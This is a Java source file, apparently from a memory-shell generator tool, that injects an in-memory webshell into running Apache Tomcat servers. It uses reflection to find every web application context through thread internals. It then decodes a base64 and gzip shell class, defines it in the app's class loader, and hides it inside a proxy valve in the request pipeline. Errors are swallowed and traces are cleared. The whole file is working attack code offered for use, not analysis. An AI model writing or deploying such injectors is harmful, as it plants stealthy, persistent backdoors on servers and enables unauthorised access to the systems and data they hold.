package org.leo.jmg.mem.injectortpl.tomcat;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.util.HashSet;
import java.util.Map;
import java.util.Set;
import java.util.zip.GZIPInputStream;

/**
 * @author ReaJason
 */
public class TomcatProxyValveInjector implements InvocationHandler {

    private Object rawValve;
    private Object proxyValve;

    private static String urlPattern;
    private static String shellClassName;
    private static String shellClass;
    private static boolean ok = false;

    public TomcatProxyValveInjector() {
        if (ok) {
            return;
        }
        Set<Object> contexts;
        try {
            contexts = getContext();
        } catch (Throwable throwable) {
            contexts = null;
        }
        if (contexts != null && !contexts.isEmpty()) {
            for (Object context : contexts) {
                try {
                    Object shell = getShell(context);
                    inject(context, shell);
                } catch (Throwable ignored) {
                }
            }
        }
        ok = true;
        shellClass = null;
        shellClassName = null;
        urlPattern = null;
    }

    public TomcatProxyValveInjector(Object rawValve, Object proxyValve) {
        this.rawValve = rawValve;
        this.proxyValve = proxyValve;
    }

    @Override
    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
        if ("invoke".equals(method.getName())) {
            try {
                // 先让 shell 处理请求，再转发给原始 valve
                method.invoke(proxyValve, args);
            } catch (Throwable e) {
                e.printStackTrace();
            }
            return method.invoke(rawValve, args);
        }
        return method.invoke(rawValve, args);
    }

    public Set<Object> getContext() throws Exception {
        Set<Object> contexts = new HashSet<Object>();
        Set<Thread> threads = Thread.getAllStackTraces().keySet();
        for (Thread thread : threads) {
            String threadName = thread.getName();
            if (threadName.contains("ContainerBackgroundProcessor")) {
                Map<?, ?> childrenMap = (Map<?, ?>) getFieldValue(getFieldValue(getFieldValue(thread, "target"), "this$0"), "children");
                for (Object value : childrenMap.values()) {
                    Map<?, ?> children = (Map<?, ?>) getFieldValue(value, "children");
                    contexts.addAll(children.values());
                }
            } else if (threadName.contains("Poller") && !threadName.contains("ajp")) {
                try {
                    Object proto = getFieldValue(getFieldValue(getFieldValue(getFieldValue(thread, "target"), "this$0"), "handler"), "proto");
                    Object engine = getFieldValue(getFieldValue(getFieldValue(getFieldValue(proto, "adapter"), "connector"), "service"), "engine");
                    Map<?, ?> childrenMap = (Map<?, ?>) getFieldValue(engine, "children");
                    for (Object value : childrenMap.values()) {
                        Map<?, ?> children = (Map<?, ?>) getFieldValue(value, "children");
                        contexts.addAll(children.values());
                    }
                } catch (Exception ignored) {
                }
            } else if (thread.getContextClassLoader() != null) {
                String name = thread.getContextClassLoader().getClass().getSimpleName();
                if (name.matches(".+WebappClassLoader")) {
                    Object resources = getFieldValue(thread.getContextClassLoader(), "resources");
                    // need WebResourceRoot not DirContext
                    if (resources != null && resources.getClass().getName().endsWith("Root")) {
                        Object context = getFieldValue(resources, "context");
                        contexts.add(context);
                    }
                }
            }
        }
        return contexts;
    }

    private ClassLoader getWebAppClassLoader(Object context) {
        try {
            return ((ClassLoader) invokeMethod(context, "getClassLoader", null, null));
        } catch (Exception e) {
            Object loader = invokeMethod(context, "getLoader", null, null);
            return ((ClassLoader) invokeMethod(loader, "getClassLoader", null, null));
        }
    }

    @SuppressWarnings("all")
    private Object getShell(Object context) throws Exception {
        ClassLoader classLoader = getWebAppClassLoader(context);
        Class<?> clazz = null;
        try {
            clazz = classLoader.loadClass(shellClassName);
        } catch (Exception e) {
            byte[] clazzByte = gzipDecompress(decodeBase64(shellClass));
            Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defineClass.setAccessible(true);
            clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
        }
        return clazz.newInstance();
    }

    @SuppressWarnings("all")
    public void inject(Object context, Object valve) throws Exception {
        Object pipeline = invokeMethod(context, "getPipeline", null, null);
        ClassLoader contextClassLoader = context.getClass().getClassLoader();
        Class<?> valveClass = contextClassLoader.loadClass("org.apache.catalina.Valve");
        Object rawValve = null;
        String fieldName = "first";
        try {
            rawValve = getFieldValue(pipeline, fieldName);
        } catch (NoSuchFieldException ignored) {
        }
        if (rawValve == null) {
            fieldName = "basic";
            rawValve = getFieldValue(pipeline, fieldName);
        }
        Object proxyValve = Proxy.newProxyInstance(contextClassLoader, new Class[]{valveClass}, new TomcatProxyValveInjector(rawValve, valve));
        setFieldValue(pipeline, fieldName, proxyValve);
    }

    @SuppressWarnings("all")
    public static byte[] decodeBase64(String base64Str) throws Exception {
        Class<?> decoderClass;
        try {
            decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
        } catch (Exception ignored) {
            decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str);
        }
    }

    @SuppressWarnings("all")
    public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        GZIPInputStream gzipInputStream = null;
        try {
            gzipInputStream = new GZIPInputStream(new ByteArrayInputStream(compressedData));
            byte[] buffer = new byte[4096];
            int n;
            while ((n = gzipInputStream.read(buffer)) > 0) {
                out.write(buffer, 0, n);
            }
            return out.toByteArray();
        } finally {
            if (gzipInputStream != null) {
                gzipInputStream.close();
            }
            out.close();
        }
    }

    public static Field getField(Object obj, String name) throws NoSuchFieldException {
        for (Class<?> clazz = obj.getClass();
             clazz != Object.class;
             clazz = clazz.getSuperclass()) {
            try {
                Field field = clazz.getDeclaredField(name);
                field.setAccessible(true);
                return field;
            } catch (NoSuchFieldException ignored) {

            }
        }
        throw new NoSuchFieldException(obj.getClass().getName() + " Field not found: " + name);
    }

    @SuppressWarnings("all")
    public static void setFieldValue(Object obj, String name, Object value) throws NoSuchFieldException, IllegalAccessException {
        Field field = getField(obj, name);
        field.set(obj, value);
    }

    @SuppressWarnings("all")
    public static Object getFieldValue(Object obj, String name) throws NoSuchFieldException, IllegalAccessException {
        Field field = getField(obj, name);
        return field.get(obj);
    }

    @SuppressWarnings("all")
    public static Object invokeMethod(Object obj, String methodName, Class<?>[] paramClazz, Object[] param) {
        try {
            Class<?> clazz = (obj instanceof Class) ? (Class<?>) obj : obj.getClass();
            Method method = null;
            while (clazz != null && method == null) {
                try {
                    if (paramClazz == null) {
                        method = clazz.getDeclaredMethod(methodName);
                    } else {
                        method = clazz.getDeclaredMethod(methodName, paramClazz);
                    }
                } catch (NoSuchMethodException e) {
                    clazz = clazz.getSuperclass();
                }
            }
            if (method == null) {
                throw new NoSuchMethodException("Method not found: " + methodName);
            }
            method.setAccessible(true);
            return method.invoke(obj instanceof Class ? null : obj, param);
        } catch (Exception e) {
            throw new RuntimeException("Error invoking method: " + methodName, e);
        }
    }

}